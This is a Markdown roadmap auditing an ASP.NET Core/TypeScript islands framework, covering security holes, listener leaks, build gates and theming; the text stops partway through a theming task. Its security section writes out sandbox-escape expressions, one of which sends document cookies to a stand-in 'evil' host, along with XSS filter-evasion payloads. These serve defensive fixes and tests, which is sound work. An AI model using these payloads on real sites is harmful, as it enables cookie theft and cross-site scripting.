# SoftMax.LaughTale — Production Readiness Roadmap (v3)

> **Status of this document:** This is the *canonical, machine-editable* work plan.
> `ROADMAP.md` tracks what was **built**; this file tracks what must be **fixed, hardened, and unified** before v3.0 can be called production-grade.
>
> **For AI agents working on this repo:** every task below has a stable ID (`LT-###`), a severity, reproducible **Evidence**, a prescribed **Fix**, and testable **Acceptance criteria**. Do not delete tasks — change `Status:` to `done` / `wontfix` and append a `Resolution:` line. Keep task IDs stable forever; new work appends new IDs.

**Audit baseline:** branch `comp` @ `88404a7`, .NET 10, 57,369 LOC (C# + TS), 76 client components, 114 TagHelper targets.

---

## 0. Executive assessment

The architecture is genuinely good. Astro-style islands on ASP.NET Core is a real gap in the .NET ecosystem, and the six-strategy hydrator, C#→TS slot projection, persistent islands, and Roslyn `SMI001`/`SMI002` diagnostics are the right primitives, well chosen. The problem is not the design. The problem is that **breadth was built on top of an unfinished foundation.**

Three structural facts drive almost every task in this document:

1. **The component layer has no lifecycle.** `0 of 76` components return an unmount function, and the library calls `addEventListener` 436 times against 7 `removeEventListener` calls. The View Transitions router replaces `document.body.innerHTML` wholesale without ever dispatching `laughtale:unmount`. Every SPA navigation therefore leaks listeners, observers, and timers. This is the single highest-value fix in the repo, and most other stability problems are downstream of it.

2. **The Theme Studio cannot theme the components.** There are **2,025 hardcoded hex literals across 66 of the 76 component files**, while the Studio writes ~20 CSS custom properties onto `document.documentElement`. Customization is architecturally disconnected from the thing it customizes. Until components consume tokens exclusively, the Studio is a demo, not a feature.

3. **The quality gates are not actually running.** `npx tsc --noEmit` reports **98 errors** — including three in `src/index.ts`, the public API barrel, which exports members that do not exist. `npm test` does not even bundle (it imports two component files that were deleted). There is no CI. `dotnet build` is clean and 9 .NET tests pass, but 9 tests do not cover 114 TagHelpers.

Two claims in `README.md` are also materially false and should be corrected before any public release: the "**sub-2 KB hydration engine**" ships as a **1.4 MB unminified `dist/index.js`** (the `build` script never passes `--prod`, and the IIFE target cannot code-split, so all ~130 registered components are inlined), and the "hardened security edition" directive sandbox is trivially escapable (see `LT-101`).

**Verdict:** roughly 70% of a very strong framework. The remaining 30% is unglamorous — lifecycle, tokens, gates, API discipline — but it is what separates "impressive demo" from "something a team can bet a product on." Sequenced below, it is about 12 weeks of focused work.

---

## 1. Severity legend & conventions

| Severity | Meaning |
|---|---|
| **P0** | Security hole, data loss, or guaranteed production failure. Ship-blocking. |
| **P1** | Correctness bug or architectural blocker for a headline feature. |
| **P2** | Design/API debt that compounds. Fix before the API is public and frozen. |
| **P3** | Polish, DX, docs. |

**Status values:** `todo` · `in-progress` · `blocked` · `done` · `wontfix`

**Conventions for implementers:**
- Every fix lands with a test. No exceptions for P0/P1.
- Do not add new public API surface while `LT-4xx` (API unification) is open.
- After touching C#, run `graphify update .` per `CLAUDE.md`.
- Regenerate bundles only via the canonical build (`LT-302`); never hand-edit `wwwroot/js/*`.

---

## 2. Phase plan

| Phase | Theme | Tasks | Est. | Gate to exit |
|---|---|---|---|---|
| **P-1** | Stop the bleeding: security + lifecycle | `LT-1xx`, `LT-2xx` | 3 wks | No P0 open; zero leaked listeners over 100 navigations |
| **P-2** | Build, gates, CI | `LT-3xx` | 1.5 wks | `tsc` clean, tests run in CI, bundle budget enforced |
| **P-3** | API + component-design unification | `LT-4xx`, `LT-5xx` | 3 wks | One canonical name per component; TagHelper base class in place |
| **P-4** | Theming: make the Studio real | `LT-6xx` | 2.5 wks | 0 hardcoded hex in components; theme survives reload + SSR |
| **P-5** | Performance | `LT-7xx` | 1.5 wks | Entry ≤ 8 KB gz; INP < 200 ms on showcase |
| **P-6** | Accessibility + production release | `LT-8xx`, `LT-9xx` | 2 wks | WCAG 2.2 AA on top 20 components; NuGet + npm published |

---

## 3. LT-1xx — Security (P0/P1)

### `LT-101` — Directive expression sandbox is escapable
**Severity:** P0 · **Status:** done · **Files:** `SoftMax.LaughTale.Client/src/directives/security.ts`, `src/directives/reactivity.ts:53-97`
**Resolution:** Replaced `new Function` with AST lexer, recursive-descent parser, and tree-walking interpreter in `src/directives/expression/`. All 46 escape vector tests in `tests/expression-sandbox.test.ts` pass, and `grep` confirms 0 instances of `new Function` or `eval` in `src/directives/`.

**Evidence.** `evaluateExpression` builds `new Function('state','window','document','location','cookie', ..., 'with(state){ return (expr); }')` and passes `undefined` for the shadowed globals. `createSandboxState` adds a `has` trap returning `false` for blocked names. Under `with`, a `has` trap returning `false` means the identifier **falls through to the enclosing scope** rather than being blocked. Only the five explicitly shadowed parameters are neutralized. Working escapes from any `l-bind` / `l-on` expression:

```
[].constructor.constructor('return globalThis')()   // Function-constructor escape; nothing in the blocklist is consulted
(function(){ return this })()                        // new Function bodies are sloppy-mode → this === globalThis
top.document.cookie                                  // `top`, `self`, `parent`, `frames` are not shadowed
setTimeout('fetch("//evil/"+document.cookie)')       // setTimeout is not shadowed
```

`globalThis` being in `BLOCKED_PROPERTIES` makes it *worse*: the `has` trap hides it from `with`, so the bare identifier resolves to the real global.

**Fix.** Blocklists cannot secure an expression evaluator; replace the evaluator, do not patch the list.
1. Write a small **parser + tree-walking interpreter** (~600 LOC) in `src/directives/expression/`. Support only: literals, identifiers resolved *exclusively* against the scope object, member access on plain data, `[]` index, call of functions explicitly present in scope, arithmetic/comparison/logical/ternary, template literals, array/object literals. Reject at parse time: `new`, assignment to member expressions, `function`, arrow bodies, `import`, and any identifier not in scope.
2. Delete `new Function` from `reactivity.ts` entirely. Deleting it also fixes `LT-104` (CSP).
3. Keep `security.ts` only for `sanitizeUrl` / `isSafeAttribute` (defense in depth, not the primary control).

**Acceptance.** New `tests/expression-sandbox.test.ts` with ≥ 40 escape attempts (the four above plus prototype-pollution, `__defineGetter__`, generator/async escapes) — all must evaluate to `undefined` and log a blocked-expression warning. `grep -rn "new Function\|eval(" src/directives/` returns nothing.

---

### `LT-102` — Server-supplied props executed as JavaScript
**Severity:** P0 · **Status:** todo · **Files:** `src/components/speed-dial.ts:749`, `src/components/split-button.ts:631`

**Evidence.**
```ts
const fn = new Function('item', item.command);   // item comes from data-props, i.e. from C#
```
`item.command` arrives through `data-props` on the island element. Any path where a menu label/command is built from user data, a CMS, or a database row becomes stored XSS with full origin privileges. It also breaks under any CSP without `unsafe-eval`.

**Fix.** Commands must be **references, not source code**.
1. Add a client-side command registry: `registerCommand(name: string, fn: (item) => void)` exported from `src/runtime/commands.ts`.
2. `item.command` becomes a registry **key**; unknown keys log a warning and no-op.
3. For the common "just navigate" case add `item.href` handled declaratively.
4. In C#, type the model as `string CommandName` and add analyzer diagnostic **`SMI003`** warning when a command-like prop contains `(`, `=>`, or `;`.

**Acceptance.** `grep -rn "new Function" src/components/` returns nothing. Speed-dial and split-button showcase pages still work via registry keys. `SMI003` fires on a code-shaped literal.

---

### `LT-103` — `sanitizeHtml` executes payloads while sanitizing them
**Severity:** P0 · **Status:** todo · **File:** `src/directives/security.ts` (`sanitizeHtml`)

**Evidence.** The function assigns `div.innerHTML = html` on a `div` created from the **live** `document`. Detached-node parsing still initiates resource loads, so `<img src=x onerror=...>` and `<svg onload=...>` fire **before** the subsequent `removeAttribute('on*')` cleanup runs. The regex fallback path is also bypassable via `<img/src=x onerror=y>` (no quotes) and `<scr<script>ipt>` nesting.

**Fix.** Parse in an inert document, and prefer the platform primitive.
1. Use `document.implementation.createHTMLDocument('')` or `new DOMParser().parseFromString(html, 'text/html')` — both inert, no resource loads, no script execution.
2. Where available, route through a **Trusted Types policy** (`trustedTypes.createPolicy('laughtale', { createHTML })`).
3. Replace the regex fallback with "return empty string" — a half-working sanitizer is worse than none.
4. Switch to an allowlist (permitted tags/attributes) rather than a denylist of dangerous ones.

**Acceptance.** `tests/security.test.ts` covers ≥ 20 payloads from the OWASP XSS filter-evasion list; assert via a mutation observer that no `onerror`/`onload` handler ever executes.

---

### `LT-104` — Framework is incompatible with a strict CSP
**Severity:** P0 · **Status:** todo (largely resolved by `LT-101` + `LT-102`)

**Evidence.** Four `new Function` sites plus 170 `innerHTML` assignments mean the framework requires `script-src 'unsafe-eval'`, which is disqualifying for most enterprise buyers — the exact audience "Enterprise Components" targets.

**Fix.** After `LT-101`/`LT-102`, add `Nonce`/`CSP` support in Core: a `LaughTaleCspMiddleware` that emits a per-request nonce, stamps it on injected `<style>` tags (`src/runtime/styles.ts`), and exposes it to the client. Document the exact recommended header.

**Acceptance.** Showcase runs clean under `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{n}'; style-src 'self' 'nonce-{n}'` with zero console violations. Add a Playwright test asserting zero `securitypolicyviolation` events.

---

### `LT-105` — Prop serialization is an unbounded data-exfiltration surface
**Severity:** P1 · **Status:** todo · **File:** `SoftMax.LaughTale.Core/Serialization/IslandJson.cs`

**Evidence.** `SerializeProps` serializes **whatever object it is handed**, in full, into a `data-props` attribute in public HTML. `JavaScriptEncoder.Default` correctly prevents *injection*, but nothing prevents *over-disclosure*: pass an EF entity and its navigation properties, `PasswordHash`, and internal IDs ship to the browser. There is no `MaxDepth`, no `ReferenceHandler`, so a cyclic graph throws mid-render (500 on a rendered page, hard to diagnose).

**Fix.**
1. Set `MaxDepth = 8` and `ReferenceHandler.IgnoreCycles`; throw a *descriptive* `IslandSerializationException` naming the island and property path.
2. Make props **opt-in**: extend `SMI002` so a type used as island props must be a `record` marked `[Island]`, and warn when a prop type is an EF entity or implements `IEnumerable` over an entity type.
3. Add `[IslandIgnore]` for per-property exclusion.
4. Add a build-time analyzer check for property names matching `password|secret|token|hash|apikey|connectionstring` → **`SMI004`** (error, not warning).

**Acceptance.** Unit tests for depth cap, cycle handling, and `SMI004`. Docs page "What not to put in props."

---

### `LT-106` — `sanitizeUrl` blocks all `data:` URIs and misses obfuscation
**Severity:** P2 · **Status:** todo · **File:** `src/directives/security.ts`

**Evidence.** `DANGEROUS_PROTOCOLS = /^\s*(javascript|data|vbscript):/i` rejects legitimate `data:image/png;base64,…` (breaking avatars, icons, and the Studio's own export preview) while still missing entity-encoded and control-char-split forms (`java&#09;script:`, `java\x00script:`).

**Fix.** Parse with `new URL(value, document.baseURI)` and allowlist the resulting `protocol` (`http:`, `https:`, `mailto:`, `tel:`, `blob:`, plus `data:` restricted to `image/(png|jpeg|gif|webp|svg+xml)` — and reject `svg+xml` for `href`, allow only for `src`). Fall back to rejection when `URL` throws.

**Acceptance.** Test matrix of 25 URL forms with expected allow/deny.

---

### `LT-107` — Router trusts and injects a full HTML response
**Severity:** P1 · **Status:** todo · **File:** `src/runtime/router.ts:85`

**Evidence.** `document.body.innerHTML = newDoc.body.innerHTML` on a fetched response. Same-origin is checked on the *link*, but not on the *final* response after redirects — an open redirect on the app turns into full-page content injection. Inline `<script>` in the new body silently does not execute (a correctness bug), while `<img onerror>` does.

**Fix.** Verify `new URL(response.url).origin === location.origin` after fetch. Adopt node-diffing (see `LT-201`) instead of `innerHTML`, and explicitly re-execute `<script>` tags from the new document by cloning them with the CSP nonce.

**Acceptance.** Test: fetch redirected cross-origin → falls back to `location.href` hard navigation.

---

## 4. LT-2xx — Lifecycle, memory & correctness (P0/P1)

### `LT-201` — No unmount lifecycle: every navigation leaks
**Severity:** P0 · **Status:** todo · **Files:** all 76 of `src/components/*.ts`, `src/runtime/hydrator.ts:76-79`, `src/runtime/router.ts:80-114`

**Evidence.** The hydrator already supports it — `hydrator.ts:77` wires `laughtale:unmount` if `mount()` returns a function — but **zero components return one**. Across the component tree there are 436 `addEventListener` calls and 7 `removeEventListener` calls; 26 files attach listeners to `document`/`window`, which outlive the element entirely. The router then discards the DOM via `innerHTML` **without ever dispatching `laughtale:unmount`**, so even a compliant component would never be told to clean up. Result: navigate the showcase 50 times and you accumulate thousands of live handlers, orphaned `IntersectionObserver`s, and running `setInterval`s.

**Fix.** Three coordinated changes:

1. **Introduce a scope helper** — `src/runtime/scope.ts`:
```ts
export interface IslandScope {
  on<K extends keyof HTMLElementEventMap>(t: EventTarget, e: K, h: (ev: any) => void, o?: AddEventListenerOptions): void;
  observe(o: { disconnect(): void }): void;   // Intersection/Resize/Mutation observers
  timer(id: number): void;                    // setTimeout / setInterval
  cleanup(fn: () => void): void;              // arbitrary teardown
  dispose(): void;                            // runs everything, idempotent
}
export function createScope(): IslandScope;
```
2. **Migrate all 76 components** to the signature `export default function X(el, props) { const s = createScope(); … ; return () => s.dispose(); }`. Mechanical: replace `el.addEventListener(` → `s.on(el, `. Budget ~6 components/day; track with a checklist in `docs/lifecycle-migration.md`.
3. **Make the router dispatch it** — before mutating the DOM:
```ts
document.querySelectorAll('[data-island]').forEach(el => {
  if (!el.closest('[data-persist]')) el.dispatchEvent(new CustomEvent('laughtale:unmount'));
});
```
Persistent islands must be *excluded* — they are moved, not destroyed.

**Acceptance.** Playwright test: navigate a 5-page loop 20× (100 navigations); assert `performance.memory.usedJSHeapSize` growth < 5 MB and detached-node count stable via CDP heap snapshot. Add an ESLint rule banning bare `addEventListener` inside `src/components/`.

---

### `LT-202` — Router swaps `<body>` but never `<head>`
**Severity:** P1 · **Status:** todo · **File:** `src/runtime/router.ts:80-114`

**Evidence.** `updateDom` copies `document.title` and `newDoc.body.innerHTML` only. Consequences on every client-side navigation: page-specific `<link rel=stylesheet>` never loads (unstyled content), `<meta name=description>` / OpenGraph tags stay stale (**SEO and social previews are wrong for every route but the entry route**), canonical links are wrong, and `<script>` in head never runs.

**Fix.** Implement head reconciliation: key existing head children by `outerHTML`, diff against the incoming head, remove stale, append new. Await `load` on newly added stylesheets *before* calling `startViewTransition`, otherwise the transition captures unstyled content (`LT-203`).

**Acceptance.** Test asserting `<meta name="description">` and per-page stylesheets update after SPA navigation.

---

### `LT-203` — View transition starts before content is ready
**Severity:** P1 · **Status:** todo · **File:** `src/runtime/router.ts:116-120`

**Evidence.** `startViewTransition(updateDom)` is called with the new HTML already fetched, but images and (post-`LT-202`) stylesheets in the new body have not loaded. The transition therefore snapshots a half-painted frame — visible flash on image-heavy pages.

**Fix.** Inside `updateDom`, after insertion, `await Promise.race([Promise.all(pendingStylesheetLoads), timeout(500)])` before resolving the transition callback. Also **cancel in-flight navigations**: hold an `AbortController` per navigation and abort the previous one — currently two fast clicks race and the slower response wins, landing the user on the wrong page.

**Acceptance.** Test: click link A then link B within 50 ms → final URL and DOM are B.

---

### `LT-204` — `pushState` ordering and lost scroll restoration
**Severity:** P2 · **Status:** todo · **File:** `src/runtime/router.ts:99-110`

**Evidence.** `pushState` runs *after* the DOM update, so if `updateDom` throws mid-way the URL and DOM disagree. `handlePopState` scrolls to top rather than restoring the previous scroll offset, so Back on a long list always loses the user's place.

**Fix.** Set `history.scrollRestoration = 'manual'`; store `{ scrollY }` in the history state on navigate-away; restore it on `popstate`. Call `pushState` before DOM mutation and roll back on throw.

**Acceptance.** Playwright: scroll 2000px, navigate, go Back → `window.scrollY` within 50px of 2000.

---

### `LT-205` — Hydration error leaves the island in a retryable-but-broken state
**Severity:** P1 · **Status:** todo · **File:** `src/runtime/hydrator.ts:87-95`

**Evidence.** On error the catch block sets `HYDRATED_FLAG = false`. If `mount()` threw *after* attaching listeners or DOM, the partial state persists and the next trigger (a second `mouseenter` under the `interaction` strategy) mounts **again**, producing duplicate handlers. Compounded by the fact that `hydrateInteraction` registers with `{ once: true }` per event but four event types — hovering *then* clicking can enter `executeHydration` twice before the flag is set on a slow module load.

**Fix.** Use a tri-state `'pending' | 'mounted' | 'failed'` set **synchronously** at entry. On failure remain `failed` (do not retry silently); expose `retryIsland(el)` for explicit recovery. Dispose the partial scope from `LT-201` on error.

**Acceptance.** Test: island whose module rejects mounts exactly once, dispatches one `laughtale:hydration-error`.

---

### `LT-206` — `IntersectionObserver` leaks for never-visible islands
**Severity:** P2 · **Status:** todo · **File:** `src/runtime/hydrator.ts:110-127`

**Evidence.** `hydrateVisible` creates an observer per island and only disconnects on intersection. Islands below a footer the user never reaches keep observers alive forever; after `LT-201`'s router unmount they will be orphaned too. Children are observed at hydration time only, so children added later (streaming SSR) are missed.

**Fix.** Use a **single shared** `IntersectionObserver` for all visible-strategy islands, keyed by a `WeakMap<Element, string>`. Register it with the island scope so unmount unobserves.

**Acceptance.** Test: 100 visible-strategy islands create exactly 1 observer.

---

### `LT-207` — `retry.ts` is typed and implemented for the wrong input
**Severity:** P1 · **Status:** todo · **File:** `src/runtime/retry.ts:28,36`

**Evidence.** Two live `tsc` errors: the function accepts `string | (() => Promise<T>)` but passes that union straight to `import(specifier)` and to `new URL(...)`. The registry supplies a **thunk**, so the string branch is dead code that would throw if ever reached, and cache-busting on retry (`?retry=n`) never actually happens for thunks — meaning a retry re-imports the identical failed module URL from the browser's module cache and **fails identically every time**. The advertised "network resilience" does not work.

**Fix.** Narrow to `() => Promise<T>` only. For genuine cache-busting, have `defineIsland` optionally accept a URL string so a fresh `import(url + '?r=' + n)` is possible; otherwise document that retry only helps transient rejections. Add exponential backoff with jitter.

**Acceptance.** Test with a loader failing twice then succeeding → resolves; failing always → rejects after N attempts with total elapsed within backoff bounds.

---

## 5. LT-3xx — Build, quality gates & CI (P1)

### `LT-301` — TypeScript does not compile (98 errors) and the public barrel is broken
**Severity:** P1 · **Status:** todo

**Evidence.** `npx tsc --noEmit` → 98 errors. Worst offenders: `context-menu.ts` (58), `split-button.ts` (15), `timeline.ts` (6). Critically, **`src/index.ts` has 3** — it re-exports `hasSlot`, `islandEvents`, and `islandStore`, none of which exist (`slots.ts` has no `hasSlot`; `events.ts` exports `onIslandEvent`; `state.ts` exports the `IslandStore` type). Any consumer writing `import { islandStore } from '@softmax/islands'` gets a runtime `undefined`. esbuild does not typecheck, which is why this shipped.

**Fix.** Fix all 98 (start with `index.ts` and `runtime/`). Enable `strict: true` incrementally per-directory. Add `"typecheck"` to a pre-build step so `npm run build` fails on type errors.

**Acceptance.** `npx tsc --noEmit` exits 0. CI enforces it.

---

### `LT-302` — Production bundle is 1.4 MB; the "sub-2 KB" claim is false
**Severity:** P1 · **Status:** todo · **File:** `SoftMax.LaughTale.Client/esbuild.config.mjs`, `package.json`

**Evidence.** `dist/index.js` = **1,397,185 bytes**, `dist/index.mjs` = 1,360,051. Causes: (a) `"build": "node esbuild.config.mjs"` never passes `--prod`, so `minify` is always `false` and sourcemaps always ship; (b) the config uses `outfile` with no `splitting: true`, and the IIFE target **cannot** code-split — so all ~130 `defineIsland` dynamic imports are inlined into one file; (c) `src/index.ts` also `export *`s the composables, animations, design-tokens and models barrels, defeating tree-shaking for consumers. Meanwhile `Showcase/wwwroot/js` contains 98 properly-split chunks from a *different* pipeline — there are two competing build paths and the published package uses the wrong one.

**Fix.**
1. `"build": "npm run typecheck && node esbuild.config.mjs --prod"`; keep a separate `build:dev`.
2. ESM build: `splitting: true`, `outdir: 'dist'`, `metafile: true`. Drop the monolithic IIFE, or restrict the IIFE entry to the **runtime only** (hydrator + registry + router ≈ the genuine sub-5 KB core) and load components as chunks.
3. Split the package: `@softmax/islands` (runtime) and `@softmax/islands-components` (the 76 components), with subpath exports.
4. Delete the duplicate pipeline; make one build script the source for Showcase, Docs, and `dist`.
5. Add a **bundle-size budget** gate: fail CI if the runtime entry exceeds **8 KB gzipped**.
6. Correct the README numbers to measured values.

**Acceptance.** `dist` runtime entry ≤ 8 KB gz, verified in CI with `metafile` output committed as a report.

---

### `LT-303` — The client test suite does not run
**Severity:** P1 · **Status:** todo · **Files:** `run-tests.mjs`, `tests/new-components.test.ts`

**Evidence.** `npm test` fails at the esbuild bundling step: `Could not resolve "../src/components/dynamic-form.ts"` and `"../src/components/terminal.ts"` — tests reference components that no longer exist. Additionally `run-tests.mjs` ends with `process.exit(result.status ?? 0)`: when the runner is killed by a signal `status` is `null`, so a **crashed test run reports success**.

**Fix.** Delete or restore the orphaned tests; change to `process.exit(result.status === 0 ? 0 : 1)`. Replace the hand-rolled bundler+runner with `vitest` (happy-dom is already a dependency) for watch mode, coverage, and proper exit codes.

**Acceptance.** `npm test` runs, reports, and returns a correct exit code. Coverage reported.

---

### `LT-304` — No CI
**Severity:** P1 · **Status:** todo

**Evidence.** No `.github/workflows`. Every gate above is advisory until CI enforces it.

**Fix.** `.github/workflows/ci.yml`: matrix on ubuntu/windows → `dotnet build -warnaserror`, `dotnet test`, `npm ci`, `npm run typecheck`, `npm test`, `npm run build`, bundle-budget check, Playwright e2e against the Showcase. Add a `release.yml` for `dotnet pack` → NuGet and `npm publish` on tag.

**Acceptance.** Green required check on PRs to `main`.

---

### `LT-305` — Build artifacts are committed to git
**Severity:** P2 · **Status:** todo

**Evidence.** `Showcase/wwwroot/js` (98 `.js` + `.map`, 3.9 MB), `Docs/wwwroot/js`, and `Components/wwwroot/js` are all tracked. `git diff --stat` on the working tree emits 58 KB of noise, burying real changes and making review of the actual source diff impractical. `.gitignore` has no entry for them.

**Fix.** `git rm --cached` the generated trees; add `.gitignore` entries; generate during build via an MSBuild target that shells the esbuild script. Keep `Components/wwwroot/icons/lucide-sprites.svg` (a real asset) but generate it from `lucide-static` with a checked-in script.

**Acceptance.** `git status` clean after a full build. Repo size drops materially.

---

### `LT-306` — .NET test coverage is 9 tests for 114 TagHelpers
**Severity:** P1 · **Status:** todo

**Evidence.** `dotnet test` → 9 passed, across 3 files, against `AuraComponentTagHelpers.cs` (5,151 lines, 114 `[HtmlTargetElement]` targets), `CompoundTagHelpers.cs` (1,601 lines), and the Roslyn generator.

**Fix.** After `LT-401` introduces a base class, add a **table-driven snapshot test**: enumerate every TagHelper via reflection, render each with default + fully-populated attributes, and snapshot the HTML. This gets meaningful coverage of all 114 in ~200 LOC and makes the `LT-401` refactor safe. Add dedicated generator tests asserting `SMI001`–`SMI004` fire and do not false-positive.

**Acceptance.** ≥ 80% line coverage on `Core` and `Generators`; every TagHelper has a render snapshot.

---

## 6. LT-4xx — API design & unification (P2)

### `LT-401` — 114 TagHelpers in one 5,151-line file with copy-pasted attribute logic
**Severity:** P2 · **Status:** todo · **File:** `SoftMax.LaughTale.Components/TagHelpers/AuraComponentTagHelpers.cs`

**Evidence.** One file, 114 `[HtmlTargetElement]` declarations. Each `Process` override hand-rolls the same camelCase/kebab-case fallback block:
```csharp
if (context.AllAttributes.TryGetAttribute("showButtons", out var sbAttr) || context.AllAttributes.TryGetAttribute("show-buttons", out sbAttr)) { … }
```
repeated per property, per component. This is the largest maintenance liability in the C# codebase: a bug in the pattern must be fixed in hundreds of places, and adding a component means duplicating 40 lines of boilerplate.

**Fix.**
1. `IslandTagHelperBase : TagHelper` providing: island name, hydrate strategy, framework, persist, media, class/style/id passthrough, and **automatic prop serialization from the TagHelper's own public properties** via cached reflection (or a source generator for zero runtime cost).
2. Attribute-name normalization once, in the base, using ASP.NET's built-in kebab-case convention (`[HtmlAttributeName("show-buttons")]` already handles this — most of the manual fallback code is redundant with the framework).
3. Split into one file per component under `TagHelpers/Aura/`. Target ≤ 80 lines per component.
4. Preserve rendered HTML exactly — `LT-306`'s snapshot tests are the safety net; land them **first**.

**Acceptance.** `AuraComponentTagHelpers.cs` deleted. No file over 300 lines. Snapshot tests byte-identical before/after.

---

### `LT-402` — Alias sprawl: no canonical component name
**Severity:** P2 · **Status:** todo · **File:** `src/index.ts:23-146`

**Evidence.** The registry defines the same component under many names: `image-compare` / `imagecompare` / `compare` / `p-compare` / `island-compare` (5 for one component); `treetable` / `tree-table` / `p-treetable` / `island-treetable`; `command` / `commandmenu` / `command-menu` / `command-palette` / `commandpalette`. `toast` is registered **twice** (lines 35 and 144) — the second silently overwrites the first. ~130 registrations cover ~76 components. Users cannot know the right name, docs cannot be authoritative, and every alias is API surface that must be supported forever.

**Fix.** Declare **one canonical kebab-case name per component** (matching the file name). Move aliases into an explicit `LEGACY_ALIASES: Record<string, string>` map that logs a deprecation warning on use, and schedule removal for v4. Extend `SMI001` to error on a non-canonical name in C#. Remove the duplicate `toast`.

**Acceptance.** `defineIsland` called exactly once per component. Alias map documented with a removal date.

---

### `LT-403` — No unified island contract
**Severity:** P2 · **Status:** todo

**Evidence.** `hydrator.ts:69` does `module.default || module` and only checks `typeof mount === 'function'`. There is no shared interface — every component invents its own props shape, its own event names, its own imperative API (or none). Nothing is discoverable, and nothing can be composed generically.

**Fix.** Define and enforce:
```ts
export interface IslandModule<P = unknown> {
  default(el: HTMLElement, props: P): (() => void) | void;
  readonly displayName?: string;
  readonly propsSchema?: JsonSchema;   // enables dev-mode prop validation
}
```
Standardize events on `laughtale:<component>:<event>` (`bubbles: true`, `detail` typed). Standardize an imperative handle exposed as `el.island` for components that need one (`open()`, `close()`, `refresh()`).

**Acceptance.** All 76 components conform; a conformance test iterates the registry and asserts the contract.

---

### `LT-404` — C# and TS models drift silently
**Severity:** P2 · **Status:** todo · **Files:** `Components/Models/ComponentModels.cs` (497 lines) ↔ `src/types/models.ts`

**Evidence.** The two are maintained by hand. `tsc` already catches the fallout: `tieredmenu.ts` imports `MenuItem` from `../types/models` — it does not exist; `split-button.ts` has 15 errors because `SplitButtonItem` lacks `command`, `items`, `target`, and `separator` that the runtime clearly uses. The C# side and the TS side have diverged and nothing detects it.

**Fix.** Make C# the source of truth and **generate** `models.ts` from `[Island]`-annotated records via the existing Roslyn generator (it already walks these types for `SMI002`). Emit into `src/types/models.generated.ts`, checked in, with a CI check that regeneration produces no diff.

**Acceptance.** Zero hand-written duplicated model types. CI fails if generated output is stale.

---

### `LT-405` — `IslandTagHelper` does not validate at runtime
**Severity:** P3 · **Status:** todo · **File:** `Core/TagHelpers/IslandTagHelper.cs`

**Evidence.** `Name` is never validated (`SMI001` only covers `[Island]`-attributed records, not the raw `<island name="...">` tag). A typo produces a silent client-side `console.warn` and a dead region of the page. `Media` is accepted without checking that `Hydrate == Media`, so `media="..."` on a `Load` island is silently ignored.

**Fix.** In `Development` environment only: validate kebab-case, warn on `media` without `hydrate="Media"`, and warn when `persist` is used on a non-`Load` strategy (persistence + lazy hydration is a footgun). Emit a visible dev-mode overlay for unregistered islands rather than a console warning.

**Acceptance.** Dev-mode diagnostics tested; zero overhead in Production (guarded by `IWebHostEnvironment`).

---

## 7. LT-5xx — Component design system (P2)

### `LT-501` — Extract a primitive layer
**Severity:** P2 · **Status:** todo

**Evidence.** `sidebar.ts` is 1,891 lines; `datatable.ts` 1,463; `treetable.ts` 1,372. The `composables/` directory already contains exactly the right primitives (`useFloatingPosition`, `useFocusTrap`, `useVirtualizer`, `useKeyboardNav`, `useScrollLock`) but the large components predate them and reimplement positioning, focus trapping, and keyboard navigation inline.

**Fix.** Refactor the top 10 largest components onto the existing composables. Expected reduction ~35% LOC and, more importantly, one implementation of focus-trap behavior to get right for `LT-801`. `treetable.ts` and `datatable.ts` share a `useDataSource` (sort/filter/page) primitive — extract it.

**Acceptance.** No component file over 800 lines. `useFloatingPosition` used by every overlay (menu, popover, tooltip, select, autocomplete, cascadeselect, context-menu, tieredmenu, split-button, speed-dial).

---

### `LT-502` — Virtualization missing from data-heavy components
**Severity:** P2 · **Status:** todo

**Evidence.** `useVirtualizer` exists (88 LOC) but `datatable.ts`, `treetable.ts`, `listbox.ts`, `multiselect.ts`, `orderlist.ts`, and `picklist.ts` render all rows. A 10k-row datatable produces 10k DOM nodes at hydration — seconds of blocking main-thread work, exactly the scenario "enterprise" implies.

**Fix.** Wire `useVirtualizer` into those six; auto-enable above a `virtualThreshold` (default 100 rows) so it is opt-out, not opt-in.

**Acceptance.** 10k-row datatable hydrates in < 200 ms with < 100 rendered rows; scroll stays at 60 fps.

---

### `LT-503` — No SSR-first markup for interactive components
**Severity:** P2 · **Status:** todo

**Evidence.** Most components build their DOM client-side from `data-props` (170 `innerHTML` sites). This contradicts the framework's core promise: a `hydrate="Visible"` datatable is an **empty box** until scrolled into view, invisible to search engines and to users with JS disabled — and it causes layout shift when it finally fills in.

**Fix.** For each component define **server-rendered skeleton markup** emitted by the TagHelper, with the client *enhancing* rather than *constructing*. Prioritize content components: datatable, treetable, dataview, timeline, accordion, tabs, breadcrumb, menu. Components must detect existing markup and adopt it (`if (el.querySelector('[data-lt-ssr]')) enhance() else construct()`).

**Acceptance.** Datatable content present in `curl` output. CLS < 0.1 on the showcase.

---

### `LT-504` — No documented component states
**Severity:** P3 · **Status:** todo

**Evidence.** Loading, empty, error, and disabled states are ad hoc — `skeleton.ts` exists but is not integrated into the components that need it.

**Fix.** A `ComponentState` convention: every data component accepts `loading`, `error`, `emptyMessage` and renders standard skeleton/empty/error presentations. Document in the Docs portal as a design-system page.

---

## 8. LT-6xx — Theming & Studio integration (P1) — *the headline feature*

### `LT-601` — 2,025 hardcoded hex colors make the Studio structurally unable to work
**Severity:** P1 · **Status:** todo · **Files:** 66 of 76 `src/components/*.ts`

**Evidence.** `grep -rho "#[0-9a-fA-F]\{6\}" src/components` → **2,025 matches across 66 files**. The Theme Studio writes ~20 CSS custom properties to `document.documentElement` (`theme-studio.ts:406-446`). Those two facts do not meet: a user changes the primary color and the vast majority of component surfaces do not move. **This is why the Studio feels like a toy.** Everything else in this section is blocked on it.

**Fix.** This is the flagship work item; do it systematically.
1. **Define the token contract** in `src/styles/design-tokens.ts` as the single source of truth: `--lt-primary-{50..950}`, `--lt-surface-{0..950}`, `--lt-text-{primary,secondary,muted,inverse}`, `--lt-border-{subtle,default,strong}`, semantic `--lt-{success,warning,danger,info}-{bg,fg,border}`, plus `--lt-radius-*`, `--lt-space-*`, `--lt-shadow-*`, `--lt-font-*`, `--lt-duration-*`. (There are already **233 distinct `var(--…)` names** in use — inventory and consolidate them into this contract first; expect to collapse them to ~90.)
2. **Codemod** the 2,025 literals: map each hex to its nearest token, rewrite as `var(--lt-…)`. Run per-file with visual regression (`LT-604`) after each batch.
3. **Add a lint gate**: fail CI on any `#rrggbb`, `rgb(`, or `hsl(` literal in `src/components/` outside `design-tokens.ts`.
4. Ship both light and dark values for every token; never define a color only inside a media query.

